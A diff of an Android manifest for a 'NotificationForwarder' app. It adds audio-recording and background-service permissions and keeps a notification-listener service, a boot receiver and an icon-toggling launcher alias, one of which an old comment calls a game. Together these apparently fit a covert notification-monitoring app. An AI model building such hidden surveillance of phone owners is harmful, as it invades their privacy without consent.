@@ -1,8 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
+    <!-- الإذونات الأساسية -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    
+    <!-- 🌟 إذن التسجيل الصوتي للمساعد البكسلي -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    
+    <!-- 🌟 إذونات تشغيل الخدمات في الخلفية بانتظام (Android 13+ & 14+) -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
 
     <application
         android:name=".NotificationForwarderApp"
@@ -14,15 +24,15 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.NotificationForwarder">
 
-        <!-- 🌟 النشاط الرئيسي معطل افتراضياً لمنع ظهوره تلقائياً عند تعطيل الـ Alias -->
+        <!-- 🌟 تم تعديل enabled إلى true ليتمكن التطبيق من الفتح للمرة الأولى بشكل طبيعي -->
         <activity
             android:name=".MainActivity"
-            android:enabled="false"
+            android:enabled="true"
             android:exported="true"
             android:launchMode="singleTask">
         </activity>
 
-        <!-- 🌟 المدخل الوحيد للعبة/التطبيق على الشاشة الرئيسية عند التثبيت -->
+        <!-- 🌟 المدخل الوحيد للأيقونة على الشاشة الرئيسية عند التثبيت -->
         <activity-alias
             android:name=".LauncherAlias"
             android:targetActivity=".MainActivity"
@@ -36,10 +46,11 @@
             </intent-filter>
         </activity-alias>
 
-        <!-- الخدمات والمستقبلات -->
+        <!-- 🌟 خدمة قراءة الإشعارات مع إضافة نوع الخدمة للتوافق مع أندرويد 14 -->
         <service
             android:name=".service.AppNotificationListenerService"
             android:exported="true"
+            android:foregroundServiceType="dataSync"
             android:label="Notification Forwarder"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
@@ -47,6 +58,7 @@
             </intent-filter>
         </service>
 
+        <!-- مستقبل التشغيل التلقائي عند إعادة تشغيل الهاتف -->
         <receiver
             android:name=".receiver.BootCompletedReceiver"
             android:enabled="true"
